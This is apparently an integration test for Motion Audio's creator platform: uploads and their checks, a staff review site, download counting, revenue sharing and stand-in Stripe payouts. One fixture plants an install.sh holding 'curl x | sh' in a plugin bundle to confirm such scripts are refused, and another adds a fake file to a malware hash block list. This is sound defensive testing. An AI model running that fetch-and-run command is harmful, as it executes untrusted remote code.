// 10.1: creators - uploads (samples, loops, pads, boards, plugins) with their automatic checks, the review site (staff
// only, its own address, never indexed; review admins grade with stars, approve, reject with a reason, take down), the
// community list and downloads (locked by the plan's key, counted once per downloader a month), the revoke list, roles
// (the owner and ADMIN_EMAILS change everything, review admins only review), the pool (each pack's share - 75% unless
// staff change it, with history - split by downloads x stars, Motion Audio's own downloads in the total), refunds, and
// the monthly payouts with a stand-in for Stripe. Makes its own database and drops it at the end.
//   node test/v101-creators.mjs postgres://postgres@127.0.0.1:55432/postgres [port]
import { spawn } from "node:child_process";
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";

const here = path.dirname(fileURLToPath(import.meta.url));
const admin = process.argv[2] || "postgres://postgres@127.0.0.1:55432/postgres", port = Number(process.argv[3] || 19110);
const S = Date.now(), dbName = "ma_v101_" + S, db = admin.replace(/\/[^/]*$/, "/" + dbName);
const pg = (await import("pg")).default;
async function sql(text) { const c = new pg.Client({ connectionString: admin }); await c.connect(); try { await c.query(text); } finally { await c.end(); } }
await sql("CREATE DATABASE " + dbName);
const files = fs.mkdtempSync(path.join(os.tmpdir(), "ma-v101-"));
process.env.DATABASE_URL = db;
process.env.LOCAL_STORAGE_DIR = files;
process.env.STRIPE_SECRET_KEY = "sk_test_standin";
process.env.RESEND_API_KEY = "re_test_standin"; process.env.MAIL_FROM = "Motion Audio <test@example.test>";   // (this process only: so the sign-in code rules are on here; the server sends no email)   // (this process only: the payouts run here with Stripe stood in)
const base = "http://127.0.0.1:" + port;
process.env.PUBLIC_URL = base;

let fails = 0;
const ok = (c, m, d) => { console.log((c ? "  ✓ " : "  ✗ ") + m + (c || d === undefined ? "" : "   -- " + JSON.stringify(d).slice(0, 900))); if (!c) fails++; };
const srv = spawn(process.execPath, [path.join(here, "..", "src", "index.js")], { env: Object.assign({}, process.env, { DATABASE_URL: db, PORT: String(port), STRIPE_SECRET_KEY: "", RESEND_API_KEY: "", PUBLIC_URL: base, REMINDERS: "off", HYMNS: "off", LOCAL_STORAGE_DIR: files }), stdio: ["ignore", "pipe", "pipe"] });
let log = ""; srv.stdout.on("data", (d) => { log += d; }); srv.stderr.on("data", (d) => { log += d; });
for (let i = 0; i < 150 && !/Motion Audio server on/.test(log); i++) await new Promise((r) => setTimeout(r, 100));
const j = async (method, p, body, tok) => { const r = await fetch(base + "/v1" + p, { method, headers: { "Content-Type": "application/json", ...(tok ? { Authorization: "Bearer " + tok } : {}) }, body: body ? JSON.stringify(body) : undefined }); return Object.assign(await r.json().catch(() => ({})), { _status: r.status }); };

// ---- test files
function wav(seconds, freq = 220, rate = 44100) {
  const n = Math.round(seconds * rate), b = Buffer.alloc(44 + n * 2);
  b.write("RIFF", 0); b.writeUInt32LE(36 + n * 2, 4); b.write("WAVE", 8); b.write("fmt ", 12); b.writeUInt32LE(16, 16); b.writeUInt16LE(1, 20); b.writeUInt16LE(1, 22);
  b.writeUInt32LE(rate, 24); b.writeUInt32LE(rate * 2, 28); b.writeUInt16LE(2, 32); b.writeUInt16LE(16, 34); b.write("data", 36); b.writeUInt32LE(n * 2, 40);
  for (let i = 0; i < n; i++) b.writeInt16LE(Math.round(Math.sin((2 * Math.PI * freq * i) / rate) * 12000 * (1 - i / n * 0.3)), 44 + i * 2);
  return b;
}
function elf(machine, extra = "") { const b = Buffer.alloc(256); b.writeUInt32BE(0x7f454c46, 0); b[4] = 2; b[5] = 1; b.writeUInt16LE(3, 16); b.writeUInt16LE(machine, 18); b.write("plugin " + extra, 64); return b; }

let browser = null;
try {
  if (!/Motion Audio server on/.test(log)) console.log(log.slice(-2000));
  const { q, one, pool } = await import("../src/db.js");
  const { makeToken, isOwner, isAdmin } = await import("../src/auth.js");
  const { writeZip } = await import("../src/zipfile.js");
  const C = await import("../src/creators.js");
  const user = async (email, name, confirmed = true) => { const u = await one("INSERT INTO users (email,name,pass_hash,email_confirmed) VALUES ($1,$2,'x',$3) RETURNING *", [email, name, confirmed]); return { u, tok: makeToken(u.id, true), plain: makeToken(u.id, false) }; };
  const ana = await user("ana@make.test", "Ana Loops"), ben = await user("ben@make.test", "Ben Pads"), rita = await user("rita@review.test", "Rita Review"), musician = await user("mo@church.test", "Mo"), owner = await user("SamuelBarfieldOfficial@gmail.com".toLowerCase(), "Samuel");
  await q("INSERT INTO review_admins (email,added_by) VALUES ('rita@review.test','test')");
  const pkey = "S" + crypto.randomBytes(8).toString("hex").toUpperCase().replace(/[^A-Z0-9]/g, "").padEnd(15, "Q").slice(0, 15);
  await q("INSERT INTO package_keys (key,plans,holder_email,trial,ends_at) VALUES ($1,$2,'mo@church.test',TRUE,now() + interval '30 days')", [pkey, ["keys"]]);   // (Central Keys - and Central Pads with it)
  const put = async (url, data) => (await fetch(url, { method: "PUT", body: data })).status;
  const send = async (tok, meta, list) => {   // like the website's upload page: make the item, upload each file, send it for review
    const r = await j("POST", "/creator/items", meta, tok); if (!r.item) return r;
    for (const f of list) { const u = await j("POST", "/creator/items/" + r.item.id + "/upload", { role: f.role, platform: f.platform, name: f.name, size: f.data.length }, tok); if (!u.url) return u; await put(u.url, f.data); }
    return Object.assign(await j("POST", "/creator/items/" + r.item.id + "/submit", {}, tok), { id: r.item.id });
  };

  console.log("roles:");
  ok(isOwner(owner.u) && isAdmin(owner.u), "the owner's address is built in: a confirmed account with it is the main admin (alongside ADMIN_EMAILS)");
  ok(!isOwner({ email: "samuelbarfieldofficial@gmail.com", email_confirmed: false }) && !isAdmin({ email: "samuelbarfieldofficial@gmail.com", email_confirmed: false }), "...but not before its email is confirmed (nobody else can sign up with it and get the staff tools)");
  ok(!isAdmin(rita.u) && await C.isReviewer(rita.u) && !(await C.isReviewer(ana.u)), "a review admin reviews; a creator doesn't");

  console.log("uploads and their automatic checks:");
  let r = await j("POST", "/creator/items", { kind: "loop", title: "Swells", rights: true });
  ok(r._status === 401, "making an item needs an account", r);
  r = await j("POST", "/creator/items", { kind: "loop", title: "Swells" }, ana.tok);
  ok(r._status === 400 && /rights/.test(r.error), "...and the rights confirmed", r);
  r = await j("POST", "/creator/items", { kind: "sample", title: "Felt", rights: true }, ana.tok);
  ok(r._status === 400 && /Central Keys or Central Instrument/.test(r.error), "samples: the creator picks Central Keys or Central Instrument", r);
  r = await send(ana.tok, { kind: "loop", title: "Ambient Swells", bpm: 72, bars: 2, key: "D", tags: "ambient, warm", rights: true }, [{ role: "source", name: "swells.wav", data: wav(3.3) }]);
  ok(r._status === 400 && /demo clip/.test(r.error), "a loop without a demo clip isn't sent", r);
  const loopId = r.id;
  let u = await j("POST", "/creator/items/" + loopId + "/upload", { role: "demo", name: "demo.wav", size: 1000 }, ana.tok); await put(u.url, wav(4, 330));
  r = await j("POST", "/creator/items/" + loopId + "/submit", {}, ana.tok);
  ok(r._status === 200 && r.item.status === "waiting" && r.item.checks.some((c) => /1 WAV loop at 72 BPM in D/.test(c.text)) && r.item.autoStars >= 1, "with the demo it's checked, packaged and waiting for review (the demo's sound quality suggests stars)", r);
  ok((await j("GET", "/community/" + loopId))._status === 404 && (await j("GET", "/community/" + loopId, null, ana.tok))._status === 200 && (await j("GET", "/community")).items.length === 0, "nothing is in the community list before review");
  r = await j("POST", "/community/" + loopId + "/download", { key: pkey });
  ok(r._status === 410, "...and it can't be downloaded", r);
  const pkg = await one("SELECT * FROM community_files WHERE item_id=$1 AND role='package'", [loopId]);
  const { listZip, readEntry } = await import("../src/zipfile.js");
  const zbuf = fs.readFileSync(path.join(files, pkg.storage_key)), entries = listZip(zbuf), man = JSON.parse(readEntry(zbuf, entries.find((e) => e.name === "manifest.json")).toString());
  ok(man.id === "community-" + loopId && man.plan === "pads" && man.format === 1 && man.items[0].kind === "loop" && man.items[0].bpm === 72 && man.items[0].key === "D" && man.items[0].sha256 && man.community.creator === "Ana Loops", "the package is a standard library zip (manifest, sha256 per file) the apps' installers already read", man);

  const notes = writeZip([{ name: "Felt/C3.wav", data: wav(1, 130.8) }, { name: "Felt/C4.wav", data: wav(1, 261.6) }, { name: "Felt/C5.wav", data: wav(1, 523.3) }]);
  r = await send(ana.tok, { kind: "instrument", pack: "keys", title: "Felt Piano", rights: true }, [{ role: "source", name: "felt.zip", data: notes }, { role: "demo", name: "felt-demo.wav", data: wav(5, 261.6) }]);
  const feltId = r.id;
  ok(r._status === 200 && r.item.pack === "keys" && r.item.checks.some((c) => /3 WAV samples, spread across the keyboard/.test(c.text)), "an instrument from WAVs named by note: made into a SoundFont", r);
  const sf = await one("SELECT storage_key FROM community_files WHERE item_id=$1 AND role='package'", [feltId]);
  const sbuf = fs.readFileSync(path.join(files, sf.storage_key)), sfe = listZip(sbuf).find((e) => /\.sf2$/.test(e.name)), sf2 = readEntry(sbuf, sfe);
  ok(sf2.toString("latin1", 0, 4) === "RIFF" && sf2.toString("latin1", 8, 12) === "sfbk" && / - community-\d+\.sf2$/.test(sfe.name), "...a real .sf2, named so the installers keep its plan", sfe.name);

  const keys = ["C", "C#", "D", "D#", "E", "F", "F#", "G", "G#", "A", "A#", "B"];
  r = await send(ben.tok, { kind: "pad", title: "Morning Pad", rights: true }, [{ role: "source", name: "morning.zip", data: writeZip(keys.slice(0, 11).map((k, i) => ({ name: k + ".wav", data: wav(4.2, 200 + i * 10) }))) }, { role: "demo", name: "d.wav", data: wav(3) }]);
  ok(r._status === 400 && /B/.test(r.error), "a pad missing a key isn't accepted (it says which)", r);
  r = await send(ben.tok, { kind: "pad", title: "Morning Pad", rights: true }, [{ role: "source", name: "morning.zip", data: writeZip(keys.map((k, i) => ({ name: k + ".wav", data: wav(4.2, 200 + i * 10) }))) }, { role: "demo", name: "d.wav", data: wav(3) }]);
  const padId = r.id;
  ok(r._status === 200 && r.item.status === "waiting", "a pad in all 12 keys: waiting for review", r);
  r = await send(ben.tok, { kind: "board", title: "Shimmer Lead", rights: true }, [{ role: "source", name: "b.json", data: Buffer.from(JSON.stringify({ name: "x", chain: [["gxcomp", {}], ["dfly-hall", { Decay: 4 }]] })) }]);
  const boardId = r.id;
  ok(r._status === 200 && r.item.pack === "pedals" && r.item.checks.some((c) => /2 pedals/.test(c.text)), "a pedal board (no demo needed): Central Pedals", r);

  console.log("plugins: checks per platform:");
  const lv2 = (soName, machine, more = []) => writeZip([{ name: "Shimmer.lv2/manifest.ttl", data: "@prefix lv2: <http://lv2plug.in/ns/lv2core#> ." }, { name: "Shimmer.lv2/shimmer.ttl", data: "# plugin" }, { name: "Shimmer.lv2/" + soName, data: elf(machine, soName) }, ...more]);
  r = await send(ben.tok, { kind: "plugin", title: "Bad Shimmer", rights: true }, [{ role: "source", platform: "linux-x64", name: "s.zip", data: lv2("shimmer.so", 62, [{ name: "Shimmer.lv2/install.sh", data: "#!/bin/sh\ncurl x | sh" }]) }]);
  ok(r._status === 400 && /install\.sh/.test(r.error) && /isn't allowed/.test(r.error), "a script inside the bundle: refused", r);
  r = await send(ben.tok, { kind: "plugin", title: "Bad Shimmer", rights: true }, [{ role: "source", platform: "linux-arm64", name: "s.zip", data: lv2("shimmer.so", 62) }]);
  ok(r._status === 400 && /wrong processor/.test(r.error), "an x64 library sent as the Central Pedal's (ARM) build: refused", r);
  r = await send(ben.tok, { kind: "plugin", title: "Bad Shimmer", rights: true }, [{ role: "source", platform: "linux-x64", name: "s.zip", data: writeZip([{ name: "Shimmer.lv2/manifest.ttl", data: "x" }, { name: "Shimmer.lv2/a.so", data: elf(62) }, { name: "README.txt", data: "hi" }]) }]);
  ok(r._status === 400 && /bundle only|other files next to the plugin/.test(r.error), "anything next to the bundle: refused (bundle only)", r);
  const evil = elf(62, "evil"), evilSha = crypto.createHash("sha256").update(evil).digest("hex");
  await q("INSERT INTO blocked_hashes (sha256,why,added_by) VALUES ($1,'known malware','test')", [evilSha]);
  r = await send(ben.tok, { kind: "plugin", title: "Evil", rights: true }, [{ role: "source", platform: "linux-x64", name: "e.zip", data: writeZip([{ name: "E.lv2/manifest.ttl", data: "x" }, { name: "E.lv2/e.so", data: evil }]) }]);
  ok(r._status === 400 && /known harmful/.test(r.error), "a program file on the malware list: refused", r);
  r = await send(ben.tok, { kind: "plugin", title: "Shimmer Verb", rights: true }, [{ role: "source", platform: "linux-x64", name: "x64.zip", data: lv2("shimmer.so", 62) }, { role: "source", platform: "linux-arm64", name: "arm.zip", data: lv2("shimmer.so", 183) }]);
  const plugId = r.id;
  ok(r._status === 200 && r.item.status === "waiting" && r.item.checks.some((c) => /Central Pedal.*One LV2 bundle/.test(c.text)) && r.item.checks.some((c) => /Linux \(64-bit PC\).*Has its manifest\.ttl/.test(c.text)), "a good LV2 plugin for PC Linux and the Central Pedal: checked per platform, waiting for review", r.item && r.item.checks);

  console.log("the review site (staff only):");
  const rp = C.reviewPath();
  ok(/^\/review-[0-9a-f]{20}$/.test(rp), "its address is unguessable (from the server's secret; REVIEW_PATH can set one)", rp);
  let page = await fetch(base + rp + "/");
  const html = await page.text();
  ok(page.status === 200 && /noindex/.test(page.headers.get("x-robots-tag") || "") && /<meta name="robots" content="noindex/.test(html) && page.headers.get("cache-control") === "no-store", "the page: never indexed, never cached", page.headers.get("x-robots-tag"));
  ok((await fetch(base + "/review/")).status === 404 && (await fetch(base + "/review-0000/")).status === 404, "a guessed address finds nothing");
  const home = await (await fetch(base + "/")).text(), create = await (await fetch(base + "/create/")).text();
  const publicFiles = []; (function walk(d) { for (const f of fs.readdirSync(d)) { const p = path.join(d, f); if (fs.statSync(p).isDirectory()) walk(p); else if (/\.(html|js|css)$/.test(f)) publicFiles.push(fs.readFileSync(p, "utf8")); } })(path.join(here, "..", "public"));
  ok(!home.includes(rp) && !create.includes(rp) && !publicFiles.some((t) => t.includes(rp)) && !publicFiles.some((t) => /\/v1\/review\/(queue|admins|share)/.test(t)), "the public pages don't carry its address or the staff calls");
  r = await j("GET", "/review/queue", null, ana.tok);
  ok(r._status === 403, "a creator can't open the queue", r);
  const signin = await import("../src/signin.js");
  ok(await signin.needsCode(rita.u) && !(await signin.needsCode(ana.u)), "a review admin confirms their sign-in with the phone code, like the main admin (a creator doesn't)");
  r = await j("GET", "/review/me", null, rita.plain);
  ok(r.reviewer && r.stepped === true, "...on a server that sends no email or texts (this one) there's no code step, so the review site lets them in, like every admin tool", r);
  r = await j("GET", "/review/queue", null, rita.tok);
  ok(r._status === 200 && r.items.length === 5 && r.items[0].kind === "plugin" && r.items[0].files.some((f) => f.role === "package" && f.platform === "linux-arm64" && f.binaries.length === 1) && r.items.every((i) => i.creatorEmail && i.checks.length), "the queue: plugins first, with the creator, files per platform, program hashes and the checks", r.items && r.items.map((i) => i.kind));
  r = await j("POST", "/review/items/" + loopId + "/approve", { stars: 9 }, rita.tok);
  ok(r._status === 400 && /1 to 5 stars/.test(r.error), "approving needs 1-5 stars", r);
  r = await j("POST", "/review/items/" + boardId + "/reject", {}, rita.tok);
  ok(r._status === 400 && /why/i.test(r.error), "rejecting needs a reason", r);
  ok((await j("POST", "/review/items/" + boardId + "/reject", { reason: "The board has no name and only two pedals." }, rita.tok))._status === 200, "rejected with a reason (emailed to the creator)");
  for (const [id, s] of [[loopId, 4], [feltId, 5], [padId, 2], [plugId, 3]]) await j("POST", "/review/items/" + id + "/approve", { stars: s }, rita.tok);
  r = await j("GET", "/creator", null, ben.tok);
  const bBoard = r.items.find((i) => i.id === boardId), bPlug = r.items.find((i) => i.id === plugId);
  ok(bBoard.status === "rejected" && /no name/.test(bBoard.reason) && bPlug.status === "live" && bPlug.stars === 3, "the creator sees the reason, and what went live with its stars", r.items.map((i) => [i.title, i.status, i.stars]));

  console.log("the community list and downloads:");
  r = await j("GET", "/community");
  const pl = r.items.find((i) => i.id === plugId);
  ok(r.items.length === 4 && pl && pl.label === "Community plugin - made by Ben Pads, checked by Motion Audio" && pl.packages["linux-arm64"] && pl.packages["linux-x64"] && !("creatorEmail" in pl) && !("checks" in pl), "live items, with the plugin's label; nothing staff-only in it", pl);
  r = await j("GET", "/community?pack=pads");
  ok(r.items.length === 2 && r.items.every((i) => i.pack === "pads"), "by sound plan (the apps ask for their plans')");
  r = await j("POST", "/community/" + loopId + "/download", {});
  ok(r._status === 401, "a download needs the plan's key or an account", r);
  r = await j("POST", "/community/" + plugId + "/download", { key: pkey, platform: "linux-arm64" });
  ok(r._status === 403 && /Central Plugins/.test(r.error), "a Central Keys key doesn't open a Central Plugins item", r);
  r = await j("POST", "/community/" + loopId + "/download", { key: pkey });
  ok(r._status === 200 && r.counted && r.id === "community-" + loopId && /^[0-9a-f]{64}$/.test(r.sha256) && r.url, "Central Pads comes with Central Keys: downloaded, and it counts", r);
  r = await j("POST", "/community/" + loopId + "/download", { key: pkey });
  ok(r._status === 200 && r.counted === false, "the same key again this month: not counted twice", r);
  r = await j("POST", "/community/" + feltId + "/download", {}, musician.tok);
  ok(r._status === 200 && r.counted, "signed in on the website with the key's plans: downloads and counts (once per account)", r);
  r = await j("POST", "/community/" + padId + "/download", { key: "SDEF-AULT-KEY0-2026" });
  ok(r._status === 200 && r.counted === false, "the default key opens it but never counts in the pool", r);
  const cnt = await one("SELECT COUNT(*)::int AS n, SUM(stars)::int AS w FROM pack_downloads WHERE creator_id IS NOT NULL");
  ok(cnt.n === 2 && cnt.w === 4 + 5, "two downloads counted, weighted by the reviewer's stars", cnt);
  r = await j("POST", "/libraries/central-pads-library/installed", { key: pkey });
  ok(r._status === 200 && r.counted && (await one("SELECT stars FROM pack_downloads WHERE creator_id IS NULL AND item_ref='central-pads-library'")).stars === 3, "Motion Audio's own library installed by an app counts too (3 stars unless staff change it)", r);
  r = await j("POST", "/community/" + loopId + "/report", { reason: "It clicks at the loop point", device: "pedal" });
  ok(r._status === 200 && (await j("GET", "/review/reports", null, rita.tok)).reports.length === 1, "a report reaches the review site");

  console.log("taking down and the revoke list:");
  r = await j("POST", "/review/items/" + plugId + "/pull", { reason: "It crashes the host.", block: true }, rita.tok);
  ok(r._status === 200, "a review admin takes the plugin down (and blocks its program files)", r);
  r = await j("GET", "/community/revoked");
  const soSha = crypto.createHash("sha256").update(elf(183, "shimmer.so")).digest("hex");
  ok(r.items.some((i) => i.libraryId === "community-" + plugId && i.status === "pulled" && /crashes/.test(i.reason)) && r.hashes.includes(soSha) && r.hashes.includes(evilSha), "the revoke list names it and its program files' sha256 (the apps remove them)", r);
  r = await j("POST", "/community/" + plugId + "/download", { key: pkey, platform: "linux-arm64" });
  ok(r._status === 410 && /taken down/.test(r.error), "it can't be downloaded any more", r);
  ok((await j("GET", "/community")).items.length === 3, "...and it's out of the list");

  console.log("Central Tracks in review:");
  const tr = await one("INSERT INTO tracks (publisher_id,title,artist,kind,stars,price_cents,status) VALUES ($1,'Held Song','Ana','Multitrack',2,1000,'review') RETURNING id", [ana.u.id]);
  await q("INSERT INTO track_files (track_id,name,storage_key,is_mix) VALUES ($1,'mix.wav','x/mix.wav',TRUE)", [tr.id]);
  r = await j("GET", "/review/queue", null, rita.tok);
  ok(r.tracks.some((t) => t.id === tr.id && t.publisherEmail === "ana@make.test"), "a held track waits in the same queue", r.tracks);
  ok((await j("GET", "/tracks")).tracks.every((t) => t.id !== String(tr.id)), "...and isn't in the store until it's approved");
  await j("POST", "/review/tracks/" + tr.id + "/approve", { stars: 5 }, rita.tok);
  const tt = await one("SELECT status, stars, price_cents FROM tracks WHERE id=$1", [tr.id]);
  ok(tt.status === "live" && tt.stars === 5 && tt.price_cents === 3000, "approved with 5 stars: live, and the stars set its single-sale price ($30)", tt);

  console.log("the main admin's pages:");
  for (const [m, p, b] of [["GET", "/review/admins"], ["POST", "/review/admins", { email: "x@y.test" }], ["POST", "/review/share", { pack: "pads", percent: 50 }], ["POST", "/review/settings", { holdTracks: false }]]) {
    r = await j(m, p, b, rita.tok); ok(r._status === 403, "a review admin can't " + m + " " + p, r);
  }
  r = await j("POST", "/review/admins", { email: "Nia@Review.test" }, owner.tok);
  ok(r._status === 200 && r.admins.some((a) => a.email === "nia@review.test" && a.added_by === owner.u.email), "the owner adds a review admin on the Review admins page", r);
  r = await j("POST", "/review/admins", { email: "nia@review.test", remove: true }, owner.tok);
  ok(!r.admins.some((a) => a.email === "nia@review.test"), "...and removes one");
  r = await j("POST", "/review/share", { pack: "pads", percent: 70, fromMonth: "2020-01" }, owner.tok);
  ok(r._status === 400 && /this month or later/.test(r.error), "a share change can't rewrite months already worked out", r);
  const thisMonth = new Date().toISOString().slice(0, 7), nextMonth = new Date(Date.UTC(new Date().getUTCFullYear(), new Date().getUTCMonth() + 1, 1)).toISOString().slice(0, 7);
  r = await j("POST", "/review/share", { pack: "pads", percent: 70, fromMonth: nextMonth, note: "launch offer ends" }, owner.tok);
  ok(r._status === 200 && r.current.pads === 0.75 && r.nextMonth.pads === 0.7 && r.history[0].note === "launch offer ends" && r.history[0].from_month === nextMonth, "the creators' share: 75% now, 70% from next month, with the history", r);
  ok(await C.shareFor("pads", thisMonth) === 0.75 && await C.shareFor("pads", nextMonth) === 0.7 && await C.shareFor("keys", nextMonth) === 0.75, "each month uses the change in effect by then");
  r = await j("POST", "/review/settings", { minPayout: 3, officialStars: 3 }, owner.tok);
  ok(r._status === 200 && r.settings.minPayoutCents === 300, "the owner sets the minimum payout", r);

  console.log("the pool: each pack's share split by downloads x stars:");
  const M = "2026-08";
  await q("DELETE FROM pack_downloads");
  const pay = async (inv, plans, cents, paid, reversedAt) => q("INSERT INTO plan_payments (invoice_id,plans,cents,paid_at,reversed,reversed_at) VALUES ($1,$2,$3,$4,$5,$6)", [inv, plans, cents, paid, !!reversedAt, reversedAt || null]);
  await pay("in_keys", ["keys", "pads"], 7000, "2026-08-05", null);                 // a Central Keys year (Central Pads with it)
  await pay("in_pads", ["pads"], 4000, "2026-03-10", null);                          // a Central Pads year from March: still paying in August
  await pay("in_old", ["plugins"], 14000, "2025-08-20", null);                       // more than a year ago: not in August
  await pay("in_refunded", ["pads"], 4000, "2026-07-01", "2026-07-15");              // refunded in July: nothing in August
  await pay("in_disputed_later", ["instrument", "pads"], 10000, "2026-06-02", "2026-09-03");   // paid back after August: August still counts it
  const inc = await C.packIncome(M);
  // keys: 7000 x 7000/11000 / 12 = 371.2; pads: 7000 x 4000/11000 / 12 + 4000/12 + 10000 x 4000/14000 / 12 = 783.5; instrument: 10000 x 10000/14000 / 12 = 595.2
  ok(inc.keys === 371 && inc.pads === 783 && inc.instrument === 595 && inc.plugins === 0 && inc.pedals === 0, "each pack's money in the month: every yearly payment counts 1/12 a month, split by the plans' prices; refunds out", inc);
  await q("INSERT INTO creator_share_changes (pack,share,from_month,note,changed_by) VALUES ('keys',0.6,'2026-07','test','test')");
  const dl = async (pack, ref, creator, stars, n) => { for (let i = 0; i < n; i++) await q("INSERT INTO pack_downloads (month,pack,item_ref,creator_id,stars,downloader) VALUES ($1,$2,$3,$4,$5,$6)", [M, pack, ref, creator, stars, "key:T" + ref + i]); };
  await dl("pads", "c" + loopId, ana.u.id, 4, 3);      // Ana's loop, 4 stars: 3 downloads -> 12
  await dl("pads", "c" + padId, ben.u.id, 2, 2);       // Ben's pad, 2 stars: 2 downloads -> 4
  await dl("pads", "central-pads-library", null, 3, 4);   // Motion Audio's own: 4 downloads -> 12
  await dl("keys", "c" + feltId, ana.u.id, 5, 1);      // Ana's piano, 5 stars
  const res = await C.sharePacks(M);
  const padsPool = res.packs.find((p) => p.pack === "pads"), keysPool = res.packs.find((p) => p.pack === "keys"), instPool = res.packs.find((p) => p.pack === "instrument");
  // pads: pot = 783 x 75% = 587; weights 12 + 4 + Motion Audio 12 = 28 -> Ana 587x12/28 = 251.57, Ben 587x4/28 = 83.86; creators' part 335 -> Ben gets the leftover cent
  ok(padsPool.share === 0.75 && padsPool.pot === 587 && padsPool.totalWeight === 28 && padsPool.motionWeight === 12, "Central Pads: 75% of $7.83 = $5.87 pot; downloads x stars 28, Motion Audio's 12", padsPool);
  const a = padsPool.creators.find((c) => c.creator === ana.u.id), b = padsPool.creators.find((c) => c.creator === ben.u.id);
  ok(a.cents === 251 && b.cents === 84 && a.weight === 12 && b.weight === 4 && a.downloads === 3, "Ana $2.51 (12/28), Ben $0.84 (4/28, with the leftover cent); Motion Audio keeps its 12/28", padsPool.creators);
  ok(keysPool.share === 0.6 && keysPool.pot === 222 && keysPool.creators[0].cents === 222, "Central Keys at the 60% staff set from July: $2.22, all Ana's", keysPool);
  ok(instPool.pot === 446 && instPool.creators.length === 0, "Central Instrument: nobody downloaded a community item, so nothing is shared", instPool);
  ok((await C.sharePacks(M)).already === true, "a month is worked out once (safe to run twice)");
  ok(C.splitPayment(24000, ["keys", "plugins", "instrument", "pedals", "pads"]).pads === 24000 * 4000 / 42000, "a bundle splits by the plans' prices");
  await C.reversePlanPayment("in_keys");
  ok((await C.packIncome("2026-10")).keys === 0 && (await one("SELECT reversed FROM plan_payments WHERE invoice_id='in_keys'")).reversed, "a refund or chargeback: the payment stops counting from then on (months already shared stay as they were)");
  await C.recordPlanPayment({ id: "in_hook", amount_paid: 7000, status_transitions: { paid_at: Math.floor(Date.parse("2026-08-10") / 1000) } }, null, ["keys"]);
  ok((await one("SELECT plans FROM plan_payments WHERE invoice_id='in_hook'")).plans.join() === "keys,pads", "a plan's invoice.paid is kept with its plans (Central Pads with every plan)");

  console.log("statements and payouts (Stripe stood in):");
  r = await j("GET", "/creator", null, ana.tok);
  const st = r.statements.find((s) => s.month === M && s.pack === "pads");
  ok(st && st.earned === 2.51 && st.downloads === 3 && st.weight === 12 && st.totalWeight === 28 && st.pot === 5.87 && st.share === 0.75 && r.unpaid === 4.73 && r.minPayout === 3, "Ana's statement: the plan money, the share, her downloads x stars against everyone's, what she earned and what's owed", r);
  const P = await import("../src/payments.js"), payouts = await import("../src/payouts.js"), transfers = [];
  P.stripe.v2.core.accounts.retrieve = async () => ({ configuration: { recipient: { capabilities: { stripe_balance: { stripe_transfers: { status: "active" } } } } } });
  P.stripe.transfers.create = async (o, opt) => { transfers.push({ ...o, key: opt.idempotencyKey }); return { id: "tr_" + transfers.length }; };
  await q("UPDATE users SET connect_account='acct_ana', connect_ready=TRUE WHERE id=$1", [ana.u.id]);
  await q("UPDATE users SET connect_account='acct_ben', connect_ready=TRUE WHERE id=$1", [ben.u.id]);
  const out = await payouts.runPayouts(new Date("2026-09-01T06:00:00Z"));
  ok(transfers.length === 1 && transfers[0].destination === "acct_ana" && transfers[0].amount === 473 && out.packs.already, "the 1st of the month: Ana's $4.73 goes to her Stripe account; Ben's $0.84 waits (under the $3 minimum)", { transfers, paid: out.paid });
  ok((await one("SELECT COUNT(*)::int AS n FROM creator_shares WHERE creator_id=$1 AND transfer_id='tr_1'", [ana.u.id])).n === 2 && (await one("SELECT transfer_id FROM creator_shares WHERE creator_id=$1", [ben.u.id])).transfer_id === null, "her statements are marked paid; Ben's stay owed");
  r = await j("GET", "/creator", null, ana.tok);
  ok(r.unpaid === 0 && r.paid === 4.73 && r.statements.every((s) => s.paid), "her page shows it paid");
  await payouts.runPayouts(new Date("2026-09-01T07:00:00Z"));
  ok(transfers.length === 1, "running it again pays nothing twice");

  console.log("the pages:");
  for (const p of ["/create/", "/studio/", "/create/maker.css", "/create/upload.js", "/studio/studio-publish.js", "/studio/lib/studio-engine.js", "/studio/lib/fx-dsp.js"]) ok((await fetch(base + p)).status === 200, p);
  const studioSrc = (f) => fs.readFileSync(path.join(here, "..", "..", f));
  ok(["central-usage/app/studio-engine.js", "central-usage/app/studio-ui.js", "central-usage/app/studio-midi.js", "central-usage/app/studio-sf2.js", "central-usage/app/studio-sounds.js", "central-usage/app/studio.css", "js/fx-dsp.js"]
    .every((f) => studioSrc(f).equals(fs.readFileSync(path.join(here, "..", "public", "studio", "lib", path.basename(f))))), "the web studio's files are the app's own (copy them again when the app's change: server/public/studio/lib)");

  // the pages in a real browser: the creator page, the studio's Publish, the review site
  try { browser = await createRequire(import.meta.url)("playwright").chromium.launch(); } catch (e) { console.log("  (no Playwright: the page checks are skipped) " + e.message); }
  if (browser) {
    const shots = process.env.SHOTS || "";
    const pg2 = await browser.newPage({ viewport: { width: 1280, height: 900 } }), errs = [];
    pg2.on("pageerror", (e) => errs.push(String(e)));
    await pg2.addInitScript((t) => localStorage.setItem("ma-token", t), ana.tok);
    await pg2.goto(base + "/create/#items");
    await pg2.waitForSelector(".item h3");
    ok((await pg2.locator(".item").count()) === 2 && /Live/.test(await pg2.locator(".item").first().innerText()), "Make & sell: My items with their status");
    if (shots) await pg2.screenshot({ path: path.join(shots, "create-items.png"), fullPage: true });
    await pg2.click("[data-tab=earnings]"); await pg2.waitForSelector("table");
    ok(/\$4\.73/.test(await pg2.locator("main").innerText()), "Earnings: paid so far and the statements");
    if (shots) await pg2.screenshot({ path: path.join(shots, "create-earnings.png"), fullPage: true });
    await pg2.click("[data-tab=upload]"); await pg2.click("[data-kind=plugin]");
    ok((await pg2.locator("input[type=file][data-platform]").count()) === 4, "Upload: a plugin takes one zip per platform");
    if (shots) await pg2.screenshot({ path: path.join(shots, "create-upload-plugin.png"), fullPage: true });
    await pg2.click("[data-kind=loop]");
    if (shots) await pg2.screenshot({ path: path.join(shots, "create-upload-loop.png"), fullPage: true });
    // the studio: a clip on the timeline, rendered and published as a loop
    await pg2.goto(base + "/studio/");
    await pg2.waitForSelector("#view-studio .st-top");
    await pg2.evaluate(() => { const S = window.CUStudio; S.edit("test clip", (p) => { const c = S.newClip("midi", 4); c.notes = [{ p: 60, v: 100, s: 0, d: 1 }, { p: 64, v: 100, s: 1, d: 1 }, { p: 67, v: 100, s: 2, d: 2 }]; p.clips[c.id] = c; p.arrangement.push({ track: p.tracks[0].id, clip: c.id, start: 0, len: 8 }); }); });
